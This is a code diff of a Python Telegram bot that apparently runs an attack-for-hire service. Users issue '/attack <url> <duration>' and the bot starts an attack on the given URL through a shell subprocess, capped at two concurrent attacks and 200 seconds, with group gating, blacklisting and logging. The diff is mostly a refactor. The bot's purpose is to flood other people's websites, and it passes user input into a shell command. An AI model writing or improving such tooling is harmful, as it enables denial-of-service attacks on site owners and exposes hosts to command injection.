@@ -3,7 +3,7 @@ import subprocess
 import time
 import threading
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext, filters
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, CallbackContext
 from pymongo import MongoClient
 
 # Configuration
@@ -65,8 +65,6 @@ async def start(update: Update, context: CallbackContext):
     await update.message.reply_text(
         "Welcome! Please join all the required channels to use the bot.", reply_markup=keyboard
     )
-    elif update.message:
-        await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
 
 # Verify Callback Query Handler
 async def verify(update: Update, context: CallbackContext):
@@ -98,35 +96,34 @@ async def verify(update: Update, context: CallbackContext):
 
 # Attack Command
 async def attack(update: Update, context: CallbackContext):
-    if update.message:
-        if not is_allowed_group(update):
-            await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
-            return
+    if not is_allowed_group(update):
+        await update.message.reply_text(f"Please join the group to use the bot: https://t.me/joinchat/{ALLOWED_GROUP_ID}")
+        return
 
-        user_id = update.message.from_user.id
-        if is_blacklisted(user_id):
-            await update.message.reply_text("You are blacklisted and cannot use this bot.")
-            return
+    user_id = update.message.from_user.id
+    if is_blacklisted(user_id):
+        await update.message.reply_text("You are blacklisted and cannot use this bot.")
+        return
 
-        if len(active_attacks) >= 2:
-            remaining_times = [data['remaining'] for data in active_attacks.values()]
-            min_remaining = min(remaining_times)
-            await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
-                                            f"Time left for current attacks: {min_remaining} seconds.")
-            return
+    if len(active_attacks) >= 2:
+        remaining_times = [data['remaining'] for data in active_attacks.values()]
+        min_remaining = min(remaining_times)
+        await update.message.reply_text(f"Two attacks are currently in progress. Please wait.\n"
+                                        f"Time left for current attacks: {min_remaining} seconds.")
+        return
 
-        try:
-            url = context.args[0]
-            duration = int(context.args[1])
-            if duration > 200:
-                duration = 200
-        except (IndexError, ValueError):
-            await update.message.reply_text("Usage: /attack <url> <duration>")
-            return
+    try:
+        url = context.args[0]
+        duration = int(context.args[1])
+        if duration > 200:
+            duration = 200
+    except (IndexError, ValueError):
+        await update.message.reply_text("Usage: /attack <url> <duration>")
+        return
 
-        attack_id = str(user_id) + "_" + str(int(time.time()))
-        active_attacks[attack_id] = {"url": url, "remaining": duration}
-        threading.Thread(target=execute_attack, args=(attack_id, update)).start()
+    attack_id = str(user_id) + "_" + str(int(time.time()))
+    active_attacks[attack_id] = {"url": url, "remaining": duration}
+    threading.Thread(target=execute_attack, args=(attack_id, update)).start()
 
 # Execute Attack Function
 def execute_attack(attack_id, update):
@@ -136,10 +133,12 @@ def execute_attack(attack_id, update):
 
     try:
         subprocess.run(command, shell=True, check=True)
-        update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
+        if update.message:
+            update.message.reply_text(f"Attack on {url} started for {duration} seconds.")
         asyncio.run(log_activity(f"User {update.message.from_user.id} started an attack on {url} for {duration} seconds."))
     except subprocess.CalledProcessError:
-        update.message.reply_text("Failed to start the attack.")
+        if update.message:
+            update.message.reply_text("Failed to start the attack.")
     finally:
         del active_attacks[attack_id]
 
